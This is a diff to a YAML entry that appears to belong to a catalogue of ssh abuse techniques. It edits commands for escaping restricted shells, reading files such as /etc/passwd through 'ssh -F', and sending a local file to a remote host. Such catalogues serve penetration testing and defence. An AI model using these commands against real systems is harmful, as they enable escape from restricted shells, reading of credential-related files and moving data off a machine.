@@ -2,7 +2,7 @@
 functions:
   execute-interactive:
     - description: Reconnecting may help bypassing restricted shells.
-      code: ssh localhost /bin/bash --noprofile --norc
+      code: ssh localhost $SHELL --noprofile --norc
   download:
     - description: Fetch a remote file from a SSH server.
       code: |
@@ -17,10 +17,9 @@ functions:
         RPATH=where_to_save
         LPATH=file_to_send
         ssh $HOST "cat > $RPATH" < $LPATH
-  read file:
+  file-read:
     - description: Read strings from text files. Reliability depends on content of files but works well with /etc/passwd
-      code: ssh -F /etc/passwd localhost
-  file exists:
-    - description: Tests whether a file exists.
-      code: ssh -i /filename localhost
+    - code: |
+        LFILE=file_to_read    
+        ssh -F $LFILE localhost
 ---
